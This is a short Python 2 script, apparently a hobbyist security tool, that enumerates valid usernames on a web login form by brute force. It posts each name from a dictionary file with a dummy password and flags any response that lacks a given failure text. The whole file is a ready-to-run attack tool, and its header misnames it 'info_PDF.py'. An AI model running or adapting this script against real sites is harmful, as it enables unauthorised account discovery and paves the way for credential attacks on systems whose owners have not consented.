#!/usr/bin/env python
# -*- coding: utf-8 -*-
################################################################################
#  Fco. Javier Rodriguez Navarro 
#  https://www.pinguytaz.net
#
#  info_PDF.py:  Programa que busca en una pagina WEB los usuarios de acceso
#                mediante fuerza bruta.
#
#  Historico:
#     - 23 Julio 2019    V1: Creación. 
#
#  Librerias
#
################################################################################
import sys
import requests

def main(argv):
   fUsuarios = 'DicUsu.txt'
   URL=''
   TextoNO=''
   headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
   vusu =''
   vclave =''


   argumentos = len(argv)-1
   if argumentos < 4:
      print "Uso: python %s URL texto_no vusu vclave [F. Usuarios]" % argv[0]
      exit(-1)
   elif argumentos == 5:
      fUsuarios = argv[5]
    
   URL = argv[1]
   TextoNO = argv[2]
   vusu=argv[3]
   vclave=argv[4]

   try:
      fp = open(fUsuarios,'r')
   except:
      print "\033[0;31mERROR al abrir el fichero: %s \033[0;m " % fUsuarios
      exit(-1)

   temp = fp.read().splitlines()
   for usuario in temp:
      datos={vusu:'{0}'.format(usuario), vclave:'ZZ'}
      r = requests.post(URL, data=datos, headers=headers)
      if TextoNO not in r.text:
         print "\033[0;32m+ %s Usuario valido\033[0;m" % usuario
      

################# Lanzamiento de la funcion principal ##########################
if __name__ == "__main__":
    main(sys.argv)

